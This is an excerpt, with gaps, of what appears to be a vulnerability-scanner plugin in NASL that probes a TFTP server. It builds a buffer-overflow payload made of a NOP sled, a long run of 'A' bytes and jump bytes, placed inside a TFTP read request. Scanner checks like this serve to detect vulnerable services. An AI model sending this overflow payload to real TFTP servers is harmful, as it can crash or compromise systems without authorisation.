if(description){
	...
	script_dependencies( "tftpd_detect.sc" );
...
if(isnull( result ) && !ContainsString( result, "File Not Found" )){
	exit( 0 );
}
attack = raw_string( 0x00, 0x01 ) + crap( data: raw_string( 0x90 ), length: 50 ) + crap( data: raw_string( 0x41 ), length: 1445 ) + raw_string( 0xe9, 0x2e, 0xfa, 0xff, 0xff, 0xeb, 0xf9, 0x90, 0x90, 0x05, 0x96, 0x40, 0x00, 0x6e, 0x65, 0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00 );
